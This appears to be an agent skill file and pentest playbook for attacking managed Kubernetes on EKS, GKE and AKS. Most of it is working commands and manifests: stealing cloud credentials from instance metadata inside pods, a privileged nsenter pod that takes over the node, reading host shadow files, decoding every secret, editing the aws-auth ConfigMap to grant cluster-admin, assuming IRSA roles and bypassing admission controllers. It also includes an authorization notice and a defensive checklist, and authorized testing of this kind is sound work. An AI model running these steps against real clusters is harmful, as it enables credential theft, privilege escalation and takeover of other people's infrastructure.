---
name: attacking-eks-gke-aks
description: Assess managed Kubernetes clusters on EKS, GKE, and AKS by exploiting the seams between cloud IAM and Kubernetes RBAC -- IRSA/OIDC trust abuse, Workload Identity Federation, pod-to-IMDS escalation, aws-auth ConfigMap takeover, node pool service account abuse, and AAD integration weaknesses. Use when pentesting a managed k8s cluster, reviewing RBAC in EKS/GKE/AKS, testing pod-to-cloud escalation, or assessing network policy enforcement across namespaces.
---

# Attacking Managed Kubernetes (EKS, GKE, AKS)

Managed Kubernetes is a special target because it operates across two
independent authorization planes: the cloud provider's IAM layer and
Kubernetes' own RBAC layer. Each plane has its own identities, policies, and
trust boundaries. The escalation paths live at the seams -- where a Kubernetes
service account maps to a cloud IAM role, where a pod inherits a node's cloud
credentials via the instance metadata service, or where a cluster-admin
binding was granted through a cloud identity mapping that nobody audits. An
attacker who understands only one plane misses the paths that cross into the
other.

Only against systems you are authorized to test.

## When to Use

- Assessing EKS, GKE, or AKS clusters during a penetration test
- Reviewing Kubernetes RBAC bindings and service account permissions
- Testing pod-to-cloud escalation via IMDS or workload identity
- Evaluating network policy enforcement and namespace isolation
- Auditing cloud-to-cluster identity mappings (aws-auth, Workload Identity, AAD)
- Checking admission controller effectiveness and bypass potential

## When NOT to Use

- **Generic Docker container escapes or vanilla k8s without a cloud provider** --
  use `exploiting-containers`
- **Cloud IAM and control-plane-only assessment (no cluster involved)** -- use
  `exploiting-cloud-platforms`
- **SSRF hitting IMDS from a web application, not from inside a pod** -- use
  `exploiting-ssrf`
- **Writing detection rules for the attacks described here** -- use
  `engineering-detections`

## Cluster Discovery and Unauthenticated Access

```bash
# Discover clusters
aws eks list-clusters --region us-east-1        # EKS
gcloud container clusters list                   # GKE
az aks list                                      # AKS

# Unauthenticated API server check
curl -k https://<api-server>:443/api/v1/namespaces
curl -k https://<api-server>:443/version

# Anonymous RBAC check -- system:anonymous may have bindings
kubectl auth can-i --list --as=system:anonymous

# Kubelet read-only port (10255) -- often disabled, worth checking
curl http://<node-ip>:10255/pods
```

If the API server returns resources to unauthenticated requests, the cluster
has anonymous auth or a misconfigured binding on `system:unauthenticated`.

## RBAC Enumeration

```bash
# What can the current identity do?
kubectl auth can-i --list
kubectl auth can-i --list --namespace kube-system

# Check for cluster-admin bindings
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") |
  {name: .metadata.name, subjects: .subjects}'

# Examine a service account token (JWT)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Find overprivileged roles (wildcard on both resources and verbs)
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]? | .resources[]? == "*" and .verbs[]? == "*") |
  .metadata.name'

# Who can create pods? Who can read secrets?
kubectl auth can-i create pods --as=system:serviceaccount:NAMESPACE:SA_NAME
kubectl auth can-i get secrets --all-namespaces --as=system:serviceaccount:NAMESPACE:SA_NAME
```

Any non-system binding to cluster-admin is a finding. Cloud provider system
components sometimes hold cluster-admin legitimately; distinguish those from
human or workload bindings.

## Pod-to-Cloud Escalation

### EKS: IMDS from Pods

```bash
# IMDSv1 -- single unauthenticated GET from any pod (unless blocked)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# IMDSv2 -- EKS sets default hop limit to 1 on Nitro instances, which blocks
# IMDSv2 from pods (extra network hop decrements TTL to 0). If hop limit >= 2:
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# Credentials returned are the EC2 node role, not the pod's IRSA role.
aws sts get-caller-identity  # confirm which role you hold
```

### GKE: Metadata from Pods

```bash
# GKE metadata server -- requires Metadata-Flavor header
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# With Workload Identity: metadata server returns a token scoped to the k8s
# SA's bound GCP SA. Without it: every pod gets the node pool's GCP SA creds.
```

### AKS: Pod Identity and IMDS

```bash
# Azure IMDS from a pod
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Pod identity (deprecated but still deployed): NMI daemonset assigns managed
# identities. If misconfigured, pods request tokens for any identity on node.
# Workload Identity (current): projected SA token exchanged for AAD token.
env | grep -i azure
cat $AZURE_FEDERATED_TOKEN_FILE 2>/dev/null
```

## Node Compromise Paths

```yaml
# Privileged pod -- full host access
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /host
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

```bash
# If you can create pods, deploy the above and you own the node.
# From the node, access IMDS, kubelet credentials, and other pods.

# hostPath mount without full privilege -- still dangerous
# Mount /etc, /var/lib/kubelet, or /var/run/docker.sock

# hostPID -- see host processes, ptrace, /proc/1/root
ls /proc/1/root/etc/shadow

# hostNetwork -- access services bound to the node's loopback
# including the kubelet API on 10250
curl -k https://127.0.0.1:10250/pods

# Check what the kubelet certificate can do
curl -k --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
  https://<api-server>/api/v1/nodes
```

## Secrets Enumeration

```bash
# Decode secrets in current namespace
kubectl get secrets -o json | jq -r '.items[].data | to_entries[] |
  "\(.key): \(.value | @base64d)"'

# All namespaces (requires cluster-wide read)
kubectl get secrets --all-namespaces -o json | jq -r '.items[] |
  "\(.metadata.namespace)/\(.metadata.name): \(.data | keys)"'

# Which pods mount secrets?
kubectl get pods --all-namespaces -o json | jq -r '.items[] |
  select(.spec.volumes[]?.secret) |
  "\(.metadata.namespace)/\(.metadata.name): \([.spec.volumes[] |
  select(.secret) | .secret.secretName])"'

# etcd -- managed providers do not expose it directly. If you find an
# endpoint (self-managed or misconfigured):
ETCDCTL_API=3 etcdctl --endpoints=https://<etcd>:2379 \
  --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
  get /registry/secrets --prefix --keys-only
```

## Cloud-Specific Attack Paths

### EKS

```bash
# aws-auth ConfigMap -- maps IAM roles/users to k8s RBAC
kubectl get configmap aws-auth -n kube-system -o yaml
# If you can edit this ConfigMap, you can grant any IAM role cluster-admin.
# This is the single most important escalation path in EKS.
kubectl edit configmap aws-auth -n kube-system

# IRSA (IAM Roles for Service Accounts) -- OIDC trust abuse
# Each EKS cluster has an OIDC provider. Service accounts annotated with
# eks.amazonaws.com/role-arn get temporary credentials for that IAM role.
# The IAM role's trust policy should restrict by namespace and SA name.
# If the trust policy uses a wildcard or missing condition:
aws iam get-role --role-name ROLE_NAME | jq '.Role.AssumeRolePolicyDocument'
# Look for:
#   "StringEquals": { "<oidc>:sub": "system:serviceaccount:*:*" }  <-- BAD
#   "StringLike" with a broad pattern                                <-- BAD
# A properly scoped trust policy restricts to one namespace:SA pair.

# Create a pod with the target SA to assume the role
kubectl run steal --image=amazon/aws-cli \
  --overrides='{"spec":{"serviceAccountName":"TARGET_SA"}}' \
  -- sleep 3600
kubectl exec -it steal -- aws sts get-caller-identity

# EKS access entries (newer alternative to aws-auth)
aws eks list-access-entries --cluster-name CLUSTER
aws eks describe-access-entry --cluster-name CLUSTER \
  --principal-arn arn:aws:iam::ACCOUNT:role/ROLE
```

### GKE

```bash
# Node pool service account -- if not using Workload Identity, every pod
# on the node inherits the node pool's GCP service account. The default
# compute SA often has Editor on the project.
gcloud container node-pools describe POOL --cluster CLUSTER --zone ZONE \
  --format="value(config.serviceAccount)"

# Check the SA's IAM bindings
gcloud projects get-iam-policy PROJECT --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:SA_EMAIL" \
  --format="value(bindings.role)"

# Workload Identity Federation -- k8s SA to GCP SA mapping
gcloud iam service-accounts get-iam-policy SA_EMAIL \
  --format=json | jq '.bindings[] |
  select(.role=="roles/iam.workloadIdentityUser")'

# If the GCP SA has iam.serviceAccountTokenCreator on other SAs,
# you can impersonate them:
gcloud auth print-access-token --impersonate-service-account=TARGET_SA_EMAIL

# GKE metadata concealment (legacy) -- hides some metadata paths but
# does not prevent token retrieval. Workload Identity is the real fix.
```

### AKS

```bash
# AAD integration -- AKS can use Azure AD for authentication
az aks show --resource-group RG --name CLUSTER \
  --query "aadProfile" -o json

# Kubelet identity -- the managed identity assigned to the VMSS nodes
az aks show --resource-group RG --name CLUSTER \
  --query "identityProfile.kubeletidentity" -o json
# If this identity has broad Azure RBAC, any pod reaching IMDS gets those
# permissions (unless using Workload Identity to scope access).

# AKS Workload Identity -- check for federated credential bindings
az identity federated-credential list \
  --identity-name IDENTITY --resource-group RG

# AKS managed AAD -- check cluster admin group membership
az aks show --resource-group RG --name CLUSTER \
  --query "aadProfile.adminGroupObjectIDs"
```

## Network Policy Assessment

```bash
# Are any NetworkPolicies defined?
kubectl get networkpolicies --all-namespaces

# If none exist, all pods can talk to all other pods across all namespaces.
# This is the default in every managed k8s offering.

# Check which CNI is installed (determines enforcement)
kubectl get pods -n kube-system | grep -E 'calico|cilium|weave|canal|azure-cni'
# EKS: VPC CNI by default (no network policy enforcement without Calico/Cilium addon)
# GKE: Dataplane V2 (Cilium-based, enforces policies when enabled)
# AKS: Azure CNI or kubenet (network policy requires Calico or Azure NPM addon)

# Test cross-namespace connectivity
kubectl run test --image=busybox --rm -it --restart=Never -- \
  wget -qO- --timeout=3 http://SERVICE.OTHER_NAMESPACE.svc.cluster.local

# Test pod-to-IMDS (should be blocked by network policy in hardened clusters)
kubectl run test --image=busybox --rm -it --restart=Never -- \
  wget -qO- --timeout=3 http://169.254.169.254/
```

Without a CNI that supports network policies, defining NetworkPolicy resources
has no effect. The policies exist in the API but are not enforced. This is a
common misunderstanding.

## Admission Controller Bypass

```bash
# List admission webhooks
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Check if Pod Security Admission (PSA) is configured
kubectl get namespaces -o json | jq '.items[] |
  {name: .metadata.name, labels: .metadata.labels |
  with_entries(select(.key | startswith("pod-security")))}'

# Common bypasses:
# 1. Create resources in a namespace without PSA labels
# 2. Use ephemeral containers (kubectl debug) -- some controllers miss these
kubectl debug node/NODE_NAME -it --image=alpine

# 3. Modify existing deployments instead of creating new pods
# 4. Use CronJobs or Jobs -- some webhooks only match Pod creates
# 5. Target the webhook's failurePolicy: if set to Ignore, disabling the
#    webhook service (or its DNS) allows all requests through
kubectl get validatingwebhookconfigurations -o json | \
  jq '.items[] | {name: .metadata.name,
  failurePolicy: .webhooks[].failurePolicy}'

# 6. Check namespaceSelector -- webhooks often exclude kube-system
kubectl get validatingwebhookconfigurations -o json | \
  jq '.items[].webhooks[] | {name: .name,
  namespaceSelector: .namespaceSelector}'
```

## Defensive Review Checklist

- RBAC: no non-system cluster-admin bindings; automountServiceAccountToken false where unused
- Pod security: PSA labels enforce restricted/baseline per namespace
- IMDS: network policy blocks 169.254.169.254 from pods (or IMDSv2 hop limit 1 on EKS)
- Workload identity: IRSA/WI/WIF in use; no pods relying on node credentials
- Network policies: defined, and CNI confirmed to enforce them
- Secrets: external secrets operator or CSI driver; not in env vars
- Admission: webhooks with failurePolicy: Fail; PSA or OPA/Gatekeeper active
- Audit logging: API server audit logs enabled and shipped to SIEM
- EKS: aws-auth restricted; IRSA trust scoped to namespace:SA
- GKE: Workload Identity enabled; default compute SA not on node pools
- AKS: AAD integration enforced; kubelet identity minimally scoped

## Rationalizations to Reject

- *"We use a managed service, so the control plane is secure."* The control
  plane is managed; RBAC bindings, workload identity, and network policies
  are not. Most cluster compromises come from misconfigured tenancy, not
  from attacking the managed API server itself.
- *"IMDSv2 blocks metadata access from pods."* Only when the hop limit is 1.
  Confirm the actual hop limit; if it was raised for any reason, pods reach
  IMDSv2 just fine. And IMDSv1 may still be enabled alongside it.
- *"We have network policies defined."* Policies are only enforced if the CNI
  supports them. EKS with the default VPC CNI and no Calico/Cilium addon
  ignores all NetworkPolicy resources silently.
- *"Our service accounts don't have any permissions."* Check the default
  service account in every namespace. If automountServiceAccountToken is
  true (the default), every pod mounts a token. Even a token with minimal
  RBAC can list pods and services -- enough for lateral movement recon.
- *"IRSA/Workload Identity scopes credentials to the pod."* Only if the IAM
  trust policy is properly restricted. A wildcard or missing sub condition in
  the OIDC trust lets any service account in the cluster assume the role.
- *"The cluster is private, so it's not exposed."* A private API endpoint
  still processes requests from within the VPC. Any pod compromise, SSRF,
  or VPN access puts the attacker on the internal network.
- *"We'll review RBAC later; the cluster is in dev."* Dev clusters often
  share IAM roles, VPC peering, and image registries with production.
  Escalation paths from dev to prod through shared cloud identity are common.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Execution** (TA0002)

- [T1610](https://attack.mitre.org/techniques/T1610/) Deploy Container _(also Defense Evasion)_ — see also `exploiting-containers`

**Credential Access** (TA0006)

- [T1552.005](https://attack.mitre.org/techniques/T1552/005/) Cloud Instance Metadata API — see also `exploiting-ssrf`, `exploiting-cloud-platforms`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `exploiting-containers` -- generic container escapes, Docker socket abuse,
  privileged container breakout techniques
- `exploiting-cloud-platforms` -- cloud IAM enumeration and privilege
  escalation once you hold cloud credentials from a pod
- `exploiting-ssrf` -- reaching IMDS through a web application rather than
  from inside a pod
- `engineering-detections` -- building detection rules for the attack
  patterns described here
